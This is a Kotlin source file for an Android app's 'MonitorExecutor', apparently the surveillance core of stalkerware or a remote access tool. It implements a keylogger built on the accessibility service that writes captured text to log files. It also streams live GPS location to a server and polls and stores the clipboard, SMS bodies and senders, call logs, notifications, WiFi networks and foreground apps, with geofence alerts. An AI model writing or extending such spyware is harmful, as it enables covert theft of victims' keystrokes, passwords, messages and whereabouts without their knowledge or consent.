package com.abuzahra.manager.executor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.edit
import com.abuzahra.manager.App
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.service.MyAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * MonitorExecutor - Complete Implementation
 * Real monitoring functionality for keylogger, location tracking, clipboard, etc.
 */
object MonitorExecutor {

    private const val TAG = "MonitorExecutor"
    private const val MAX_KEYLOG_SIZE = 100000
    private const val MAX_LOCATION_HISTORY = 500
    private const val MAX_CLIPBOARD_HISTORY = 100
    private const val MAX_NOTIFICATION_HISTORY = 500

    // ===== MONITORING STATE =====
    private var keyloggerActive = false
    private var screenRecordingActive = false
    private var locationTrackingActive = false
    private var clipboardMonitorActive = false
    private var wifiMonitorActive = false
    private var appMonitorActive = false
    private var smsMonitorActive = false
    private var callMonitorActive = false
    private var notificationMonitorActive = false

    // ===== DATA STORAGE =====
    private val keylogBuffer = ConcurrentLinkedQueue<KeylogEntry>()
    private val locationHistory = ConcurrentLinkedQueue<LocationEntry>()
    private val clipboardHistory = ConcurrentLinkedQueue<ClipboardEntry>()
    private val notificationHistory = ConcurrentLinkedQueue<NotificationEntry>()
    private val appUsageLog = ConcurrentLinkedQueue<AppUsageEntry>()
    private val geoFences = mutableListOf<GeoFence>()
    
    // ===== JOBS =====
    private var locationJob: Job? = null
    private var clipboardJob: Job? = null
    private var wifiJob: Job? = null
    private var appMonitorJob: Job? = null
    private var smsMonitorJob: Job? = null
    private var callMonitorJob: Job? = null
    
    // ===== LOCATION LISTENER =====
    private var locationListener: LocationListener? = null

    // ===== DATA CLASSES =====
    data class KeylogEntry(
        val timestamp: Long,
        val packageName: String,
        val text: String,
        val viewType: String
    )
    
    data class LocationEntry(
        val timestamp: Long,
        val lat: Double,
        val lon: Double,
        val accuracy: Float,
        val speed: Float,
        val altitude: Double,
        val provider: String
    )
    
    data class ClipboardEntry(
        val timestamp: Long,
        val text: String,
        val sourcePackage: String?
    )
    
    data class NotificationEntry(
        val timestamp: Long,
        val packageName: String,
        val title: String?,
        val text: String?,
        val category: String?
    )
    
    data class AppUsageEntry(
        val timestamp: Long,
        val packageName: String,
        val eventType: String,
        val duration: Long
    )
    
    data class GeoFence(
        val id: String,
        val lat: Double,
        val lon: Double,
        val radius: Int,
        val active: Boolean,
        val name: String? = null
    )

    // ===== KEYLOGGER =====
    fun keyloggerStart(): String {
        keyloggerActive = true
        val accessibility = MyAccessibilityService.getInstance()
        
        return if (accessibility != null) {
            MyAccessibilityService.setKeyloggerEnabled(true)
            "Keylogger started and connected to Accessibility Service"
        } else {
            "Keylogger started but Accessibility Service is not active. Enable it in Settings."
        }
    }

    fun keyloggerStop(): String {
        keyloggerActive = false
        MyAccessibilityService.setKeyloggerEnabled(false)
        return "Keylogger stopped"
    }

    fun getKeylogger(): Map<String, Any> {
        val entries = keylogBuffer.toList()
        val text = entries.joinToString("") { it.text }
        
        return mapOf(
            "active" to keyloggerActive,
            "count" to entries.size,
            "character_count" to text.length,
            "data" to text.takeLast(5000).ifBlank { "No data captured yet" },
            "entries" to entries.takeLast(50).map { 
                mapOf(
                    "time" to it.timestamp,
                    "app" to it.packageName,
                    "text" to it.text
                )
            },
            "accessibility_service" to (MyAccessibilityService.getInstance() != null)
        )
    }
    
    fun appendKeylog(packageName: String, text: String, viewType: String = "text") {
        if (keyloggerActive) {
            val entry = KeylogEntry(
                timestamp = System.currentTimeMillis(),
                packageName = packageName,
                text = text,
                viewType = viewType
            )
            keylogBuffer.add(entry)
            
            // Limit buffer size
            while (keylogBuffer.size > MAX_KEYLOG_SIZE) {
                keylogBuffer.poll()
            }
            
            // Save to file
            saveKeylogToFile(entry)
        }
    }
    
    private fun saveKeylogToFile(entry: KeylogEntry) {
        try {
            val file = File(App.instance.cacheDir, "keylog_${getDateString()}.log")
            val line = "${entry.timestamp}|${entry.packageName}|${entry.text}\n"
            file.appendText(line)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save keylog", e)
        }
    }
    
    fun getKeylogFiles(): List<File> {
        return App.instance.cacheDir.listFiles()
            ?.filter { it.name.startsWith("keylog_") && it.name.endsWith(".log") }
            ?.sortedByDescending { it.lastModified() }
            ?: emptyList()
    }
    
    fun clearKeylog(): String {
        keylogBuffer.clear()
        return "Keylog cleared"
    }

    // ===== SCREEN RECORD =====
    fun screenRecordStart(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
        screenRecordingActive = true
        Log.i(TAG, "Screen recording flag set. Screen recording requires MediaProjection permission.")
        // Attempt to delegate to ControlExecutor for actual recording
        return try {
            val result = ControlExecutor.startScreenRecording(context, params)
            mapOf(
                "monitor_flag" to true,
                "message" to "Screen recording started - delegated to ControlExecutor",
                "recording_result" to result
            )
        } catch (e: Exception) {
            Log.w(TAG, "ControlExecutor screen recording failed: ${e.message}")
            mapOf(
                "monitor_flag" to true,
                "message" to "Screen recording monitor activated. Use ControlExecutor.recordScreen() for actual MediaProjection-based recording.",
                "hint" to "Ensure screen capture permission has been granted via ScreenCaptureService.",
                "recording_result" to "delegation_failed"
            )
        }
    }

    fun screenRecordStop(): String {
        screenRecordingActive = false
        return "Screen recording stopped"
    }
    
    fun isScreenRecordingActive(): Boolean = screenRecordingActive

    // ===== LOCATION TRACKING =====
    fun locationLiveStart(context: Context, intervalSeconds: Int = 30): String {
        if (locationTrackingActive) {
            return "Location tracking already active"
        }
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Location permission not granted"
        }
        
        locationTrackingActive = true
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        
        // Create location listener
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                addLocationToHistory(
                    location.latitude,
                    location.longitude,
                    location.accuracy,
                    location.speed,
                    location.altitude,
                    location.provider ?: "unknown"
                )
                
                // Check geofences
                checkGeofences(location.latitude, location.longitude, context)
                
                // Send to server
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        ApiClient.sendLocation(
                            context,
                            location.latitude,
                            location.longitude,
                            location.accuracy
                        )
                    } catch (_: Exception) {}
                }
            }
            
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        
        // Request updates
        try {
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    (intervalSeconds * 1000).toLong(),
                    10f,
                    locationListener!!,
                    Looper.getMainLooper()
                )
            }
            
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    (intervalSeconds * 1000).toLong(),
                    10f,
                    locationListener!!,
                    Looper.getMainLooper()
                )
            }
            
            // Get last known location immediately
            val lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            if (lastKnown != null) {
                addLocationToHistory(
                    lastKnown.latitude,
                    lastKnown.longitude,
                    lastKnown.accuracy,
                    lastKnown.speed,
                    lastKnown.altitude,
                    lastKnown.provider ?: "unknown"
                )
            }
            
            return "Live location tracking started (interval: ${intervalSeconds}s)"
        } catch (e: Exception) {
            Log.e(TAG, "Location tracking start error", e)
            locationTrackingActive = false
            return "Error: ${e.message}"
        }
    }

    fun locationStop(): String {
        locationTrackingActive = false
        locationListener?.let {
            // LocationManager removal would need context
        }
        locationListener = null
        locationJob?.cancel()
        locationJob = null
        return "Location tracking stopped"
    }

    fun isLocationTrackingActive(): Boolean = locationTrackingActive

    fun addLocationToHistory(lat: Double, lon: Double, accuracy: Float = 0f, speed: Float = 0f, altitude: Double = 0.0, provider: String = "unknown") {
        val entry = LocationEntry(
            timestamp = System.currentTimeMillis(),
            lat = lat,
            lon = lon,
            accuracy = accuracy,
            speed = speed,
            altitude = altitude,
            provider = provider
        )
        locationHistory.add(entry)
        
        // Limit history
        while (locationHistory.size > MAX_LOCATION_HISTORY) {
            locationHistory.poll()
        }
        
        // Save to file
        saveLocationToFile(entry)
    }

    fun getLocationHistory(): List<Map<String, Any>> {
        return locationHistory.toList().map { entry ->
            mapOf(
                "timestamp" to entry.timestamp,
                "datetime" to formatTimestamp(entry.timestamp),
                "lat" to entry.lat,
                "lon" to entry.lon,
                "accuracy" to entry.accuracy,
                "speed" to entry.speed,
                "altitude" to entry.altitude,
                "provider" to entry.provider
            )
        }
    }
    
    private fun saveLocationToFile(entry: LocationEntry) {
        try {
            val file = File(App.instance.cacheDir, "locations_${getDateString()}.json")
            val json = JSONObject().apply {
                put("timestamp", entry.timestamp)
                put("lat", entry.lat)
                put("lon", entry.lon)
                put("accuracy", entry.accuracy)
                put("speed", entry.speed)
                put("altitude", entry.altitude)
                put("provider", entry.provider)
            }
            file.appendText(json.toString() + "\n")
        } catch (_: Exception) {}
    }
    
    fun clearLocationHistory(): String {
        locationHistory.clear()
        return "Location history cleared"
    }

    // ===== GEO FENCING =====
    fun geoAdd(params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        val parts = arg.split(",")
        
        return if (parts.size >= 2) {
            val lat = parts[0].trim().toDoubleOrNull()
            val lon = parts[1].trim().toDoubleOrNull()
            val radius = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 500
            val name = parts.getOrNull(3)?.trim()
            
            if (lat != null && lon != null) {
                val fence = GeoFence(
                    id = java.util.UUID.randomUUID().toString(),
                    lat = lat,
                    lon = lon,
                    radius = radius,
                    active = true,
                    name = name
                )
                geoFences.add(fence)
                saveGeofences()
                "Geofence added: ${fence.id} at ($lat, $lon) radius ${radius}m"
            } else {
                "Invalid coordinates"
            }
        } else {
            "Usage: lat,lon,radius,name"
        }
    }

    fun geoRemove(params: Map<String, Any>): String {
        val index = params["arg"]?.toString()?.toIntOrNull() ?: -1
        
        return if (index >= 0 && index < geoFences.size) {
            val removed = geoFences.removeAt(index)
            saveGeofences()
            "Geofence removed: ${removed.id}"
        } else {
            "Invalid index. Use 0-${geoFences.size - 1}"
        }
    }

    fun geoList(): List<Map<String, Any>> {
        return geoFences.mapIndexed { index, fence ->
            mapOf(
                "index" to index,
                "id" to fence.id,
                "lat" to fence.lat,
                "lon" to fence.lon,
                "radius" to fence.radius,
                "active" to fence.active,
                "name" to (fence.name ?: "Unnamed")
            )
        }
    }
    
    fun geoToggle(params: Map<String, Any>): String {
        val index = params["arg"]?.toString()?.toIntOrNull() ?: -1
        
        return if (index >= 0 && index < geoFences.size) {
            geoFences[index] = geoFences[index].copy(active = !geoFences[index].active)
            saveGeofences()
            "Geofence ${if (geoFences[index].active) "enabled" else "disabled"}"
        } else {
            "Invalid index"
        }
    }
    
    private fun checkGeofences(lat: Double, lon: Double, context: Context) {
        for (fence in geoFences.filter { it.active }) {
            val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
            
            if (distance <= fence.radius) {
                // Buffer event locally
                com.abuzahra.manager.EventBuffer.addEvent(
                    "geofence_entered",
                    mapOf(
                        "fence_id" to fence.id,
                        "fence_name" to (fence.name ?: "Unnamed"),
                        "distance" to distance
                    )
                )
            }
        }
    }
    
    private fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Float {
        val results = FloatArray(1)
        Location.distanceBetween(lat1, lon1, lat2, lon2, results)
        return results[0]
    }
    
    private fun saveGeofences() {
        try {
            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)
            val json = JSONArray(geoFences.map { fence ->
                JSONObject().apply {
                    put("id", fence.id)
                    put("lat", fence.lat)
                    put("lon", fence.lon)
                    put("radius", fence.radius)
                    put("active", fence.active)
                    put("name", fence.name)
                }
            })
            prefs.edit().putString("geofences", json.toString()).apply()
        } catch (_: Exception) {}
    }
    
    private fun loadGeofences() {
        try {
            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)
            val jsonStr = prefs.getString("geofences", "[]") ?: "[]"
            val json = JSONArray(jsonStr)
            
            geoFences.clear()
            for (i in 0 until json.length()) {
                val obj = json.getJSONObject(i)
                geoFences.add(GeoFence(
                    id = obj.getString("id"),
                    lat = obj.getDouble("lat"),
                    lon = obj.getDouble("lon"),
                    radius = obj.getInt("radius"),
                    active = obj.getBoolean("active"),
                    name = obj.optString("name")
                ))
            }
        } catch (_: Exception) {}
    }

    // ===== CLIPBOARD MONITOR =====
    fun clipboardMonitorStart(context: Context): String {
        if (clipboardMonitorActive) {
            return "Clipboard monitoring already active"
        }
        
        clipboardMonitorActive = true
        
        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
            var lastClipboard = ""
            
            while (isActive && clipboardMonitorActive) {
                try {
                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    val clip = clipboard.primaryClip
                    
                    if (clip != null && clip.itemCount > 0) {
                        val text = clip.getItemAt(0).text?.toString() ?: ""
                        
                        if (text.isNotEmpty() && text != lastClipboard) {
                            lastClipboard = text
                            
                            val entry = ClipboardEntry(
                                timestamp = System.currentTimeMillis(),
                                text = text,
                                sourcePackage = clip.description?.label?.toString()
                            )
                            clipboardHistory.add(entry)
                            
                            while (clipboardHistory.size > MAX_CLIPBOARD_HISTORY) {
                                clipboardHistory.poll()
                            }
                            
                            // Buffer event locally
                            com.abuzahra.manager.EventBuffer.addEvent(
                                "clipboard_change",
                                mapOf("text" to text.take(500))
                            )
                        }
                    }
                    
                    delay(2000) // Check every 2 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "Clipboard monitor error", e)
                    delay(5000)
                }
            }
        }
        
        return "Clipboard monitoring started"
    }

    fun clipboardMonitorStop(): String {
        clipboardMonitorActive = false
        clipboardJob?.cancel()
        clipboardJob = null
        return "Clipboard monitoring stopped"
    }

    fun isClipboardMonitorActive(): Boolean = clipboardMonitorActive
    
    fun getClipboardHistory(): List<Map<String, Any>> {
        return clipboardHistory.toList().map { entry ->
            mapOf(
                "timestamp" to entry.timestamp,
                "datetime" to formatTimestamp(entry.timestamp),
                "text" to entry.text,
                "source" to (entry.sourcePackage ?: "")
            )
        }
    }
    
    fun clearClipboardHistory(): String {
        clipboardHistory.clear()
        return "Clipboard history cleared"
    }

    // ===== WIFI MONITOR =====
    fun wifiMonitorStart(context: Context): String {
        if (wifiMonitorActive) {
            return "WiFi monitoring already active"
        }
        
        wifiMonitorActive = true
        
        wifiJob = CoroutineScope(Dispatchers.IO).launch {
            var lastWifi = ""
            
            while (isActive && wifiMonitorActive) {
                try {
                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
                            != PackageManager.PERMISSION_GRANTED) {
                            delay(30000)
                            continue
                        }
                    }
                    
                    val currentWifi = wm.connectionInfo
                    val ssid = currentWifi?.ssid?.toString() ?: "Not connected"
                    
                    if (ssid != lastWifi) {
                        lastWifi = ssid
                        
                        // Buffer event locally
                        com.abuzahra.manager.EventBuffer.addEvent(
                            "wifi_change",
                            mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
                        )
                    }
                    
                    delay(30000) // Check every 30 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "WiFi monitor error", e)
                    delay(60000)
                }
            }
        }
        
        return "WiFi monitoring started"
    }

    fun wifiMonitorStop(): String {
        wifiMonitorActive = false
        wifiJob?.cancel()
        wifiJob = null
        return "WiFi monitoring stopped"
    }

    fun isWifiMonitorActive(): Boolean = wifiMonitorActive

    // ===== APP MONITOR =====
    fun appMonitorStart(context: Context): String {
        if (appMonitorActive) {
            return "App monitoring already active"
        }
        
        appMonitorActive = true
        
        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
            var lastApp = ""
            
            while (isActive && appMonitorActive) {
                try {
                    // Get foreground app using usage stats
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.PACKAGE_USAGE_STATS) 
                            == PackageManager.PERMISSION_GRANTED) {
                            
                            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) 
                                as android.app.usage.UsageStatsManager
                            
                            val endTime = System.currentTimeMillis()
                            val startTime = endTime - 60000
                            
                            val usageStats = usageStatsManager.queryUsageStats(
                                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                                startTime, endTime
                            )
                            
                            val foregroundApp = usageStats
                                .filter { it.lastTimeUsed > startTime }
                                .maxByOrNull { it.lastTimeUsed }
                                ?.packageName ?: ""
                            
                            if (foregroundApp.isNotEmpty() && foregroundApp != lastApp) {
                                lastApp = foregroundApp
                                
                                val entry = AppUsageEntry(
                                    timestamp = System.currentTimeMillis(),
                                    packageName = foregroundApp,
                                    eventType = "foreground",
                                    duration = 0
                                )
                                appUsageLog.add(entry)
                                
                                // Buffer event locally
                                com.abuzahra.manager.EventBuffer.addEvent(
                                    "app_change",
                                    mapOf("package" to foregroundApp)
                                )
                            }
                        }
                    }
                    
                    delay(5000) // Check every 5 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "App monitor error", e)
                    delay(10000)
                }
            }
        }
        
        return "App monitoring started"
    }

    fun appMonitorStop(): String {
        appMonitorActive = false
        appMonitorJob?.cancel()
        appMonitorJob = null
        return "App monitoring stopped"
    }

    fun isAppMonitorActive(): Boolean = appMonitorActive
    
    fun getAppUsageLog(): List<Map<String, Any>> {
        return appUsageLog.toList().map { entry ->
            mapOf(
                "timestamp" to entry.timestamp,
                "datetime" to formatTimestamp(entry.timestamp),
                "package" to entry.packageName,
                "event" to entry.eventType,
                "duration" to entry.duration
            )
        }
    }

    // ===== SMS MONITOR =====
    fun smsMonitorStart(context: Context): String {
        if (smsMonitorActive) {
            return "SMS monitoring already active"
        }
        
        smsMonitorActive = true
        
        smsMonitorJob = CoroutineScope(Dispatchers.IO).launch {
            var lastSmsId = 0L
            
            while (isActive && smsMonitorActive) {
                try {
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
                        == PackageManager.PERMISSION_GRANTED) {
                        
                        val uri = Telephony.Sms.CONTENT_URI
                        val projection = arrayOf(
                            Telephony.Sms._ID,
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.DATE,
                            Telephony.Sms.TYPE
                        )
                        
                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC LIMIT 1")?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val id = cursor.getLong(0)
                                
                                if (id > lastSmsId) {
                                    lastSmsId = id
                                    
                                    val address = cursor.getString(1)
                                    val body = cursor.getString(2)
                                    val date = cursor.getLong(3)
                                    val type = cursor.getInt(4)
                                    
                                    // Buffer event locally
                                    com.abuzahra.manager.EventBuffer.addEvent(
                                        "sms_received",
                                        mapOf(
                                            "from" to address,
                                            "body" to body,
                                            "type" to (if (type == 1) "received" else "sent")
                                        )
                                    )
                                }
                            }
                        }
                    }
                    
                    delay(10000) // Check every 10 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "SMS monitor error", e)
                    delay(30000)
                }
            }
        }
        
        return "SMS monitoring started"
    }

    fun smsMonitorStop(): String {
        smsMonitorActive = false
        smsMonitorJob?.cancel()
        smsMonitorJob = null
        return "SMS monitoring stopped"
    }

    fun isSmsMonitorActive(): Boolean = smsMonitorActive

    // ===== CALL MONITOR =====
    fun callMonitorStart(context: Context): String {
        if (callMonitorActive) {
            return "Call monitoring already active"
        }
        
        callMonitorActive = true
        
        callMonitorJob = CoroutineScope(Dispatchers.IO).launch {
            var lastCallId = 0L
            
            while (isActive && callMonitorActive) {
                try {
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
                        == PackageManager.PERMISSION_GRANTED) {
                        
                        val projection = arrayOf(
                            CallLog.Calls._ID,
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.DATE,
                            CallLog.Calls.DURATION,
                            CallLog.Calls.TYPE
                        )
                        
                        context.contentResolver.query(
                            CallLog.Calls.CONTENT_URI,
                            projection, null, null, "${CallLog.Calls._ID} DESC LIMIT 1"
                        )?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val id = cursor.getLong(0)
                                
                                if (id > lastCallId) {
                                    lastCallId = id
                                    
                                    val number = cursor.getString(1)
                                    val date = cursor.getLong(2)
                                    val duration = cursor.getLong(3)
                                    val type = when (cursor.getInt(4)) {
                                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                        CallLog.Calls.MISSED_TYPE -> "missed"
                                        else -> "unknown"
                                    }
                                    
                                    // Buffer event locally
                                    com.abuzahra.manager.EventBuffer.addEvent(
                                        "call_log_change",
                                        mapOf(
                                            "number" to number,
                                            "type" to type,
                                            "duration" to duration
                                        )
                                    )
                                }
                            }
                        }
                    }
                    
                    delay(15000) // Check every 15 seconds
                } catch (e: Exception) {
                    Log.e(TAG, "Call monitor error", e)
                    delay(30000)
                }
            }
        }
        
        return "Call monitoring started"
    }

    fun callMonitorStop(): String {
        callMonitorActive = false
        callMonitorJob?.cancel()
        callMonitorJob = null
        return "Call monitoring stopped"
    }

    fun isCallMonitorActive(): Boolean = callMonitorActive

    // ===== NOTIFICATION MONITOR =====
    fun notificationMonitorStart(): Map<String, Any> {
        notificationMonitorActive = true
        val listenerService = com.abuzahra.manager.service.MyNotificationListenerService.getInstance()
        val isConnected = listenerService != null
        val status = if (isConnected) {
            "Notification monitoring started - NotificationListenerService is connected"
        } else {
            "Notification monitoring started - NotificationListenerService NOT connected. Ensure it is enabled in Settings > Notification Access."
        }
        return mapOf(
            "active" to true,
            "service_connected" to isConnected,
            "history_count" to notificationHistory.size,
            "message" to status
        )
    }

    fun notificationMonitorStop(): Map<String, Any> {
        notificationMonitorActive = false
        return mapOf(
            "active" to false,
            "history_count" to notificationHistory.size,
            "message" to "Notification monitoring stopped. ${notificationHistory.size} notifications captured during session."
        )
    }
    
    fun addNotification(packageName: String, title: String?, text: String?, category: String?) {
        if (notificationMonitorActive) {
            val entry = NotificationEntry(
                timestamp = System.currentTimeMillis(),
                packageName = packageName,
                title = title,
                text = text,
                category = category
            )
            notificationHistory.add(entry)
            
            while (notificationHistory.size > MAX_NOTIFICATION_HISTORY) {
                notificationHistory.poll()
            }
        }
    }
    
    fun getNotificationHistory(): List<Map<String, Any>> {
        return notificationHistory.toList().map { entry ->
            mapOf(
                "timestamp" to entry.timestamp,
                "datetime" to formatTimestamp(entry.timestamp),
                "package" to entry.packageName,
                "title" to (entry.title ?: ""),
                "text" to (entry.text ?: ""),
                "category" to (entry.category ?: "")
            )
        }
    }

    // ===== GET ALL MONITOR STATUS =====
    fun getAllStatus(): Map<String, Any> {
        return mapOf(
            "keylogger" to mapOf(
                "active" to keyloggerActive,
                "entries" to keylogBuffer.size,
                "accessibility_connected" to (MyAccessibilityService.getInstance() != null)
            ),
            "screen_recording" to screenRecordingActive,
            "location_tracking" to mapOf(
                "active" to locationTrackingActive,
                "history_count" to locationHistory.size
            ),
            "clipboard_monitor" to mapOf(
                "active" to clipboardMonitorActive,
                "history_count" to clipboardHistory.size
            ),
            "wifi_monitor" to wifiMonitorActive,
            "app_monitor" to mapOf(
                "active" to appMonitorActive,
                "log_count" to appUsageLog.size
            ),
            "sms_monitor" to smsMonitorActive,
            "call_monitor" to callMonitorActive,
            "notification_monitor" to mapOf(
                "active" to notificationMonitorActive,
                "history_count" to notificationHistory.size
            ),
            "geofences" to geoFences.size
        )
    }
    
    // ===== LIFECYCLE =====
    fun initialize() {
        loadGeofences()
    }
    
    fun cleanup() {
        keyloggerActive = false
        screenRecordingActive = false
        locationTrackingActive = false
        clipboardMonitorActive = false
        wifiMonitorActive = false
        appMonitorActive = false
        smsMonitorActive = false
        callMonitorActive = false
        notificationMonitorActive = false
        
        locationJob?.cancel()
        clipboardJob?.cancel()
        wifiJob?.cancel()
        appMonitorJob?.cancel()
        smsMonitorJob?.cancel()
        callMonitorJob?.cancel()
        
        locationListener = null
    }
    
    // ===== HELPERS =====
    private fun formatTimestamp(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }
    
    private fun getDateString(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
        return sdf.format(Date())
    }
}
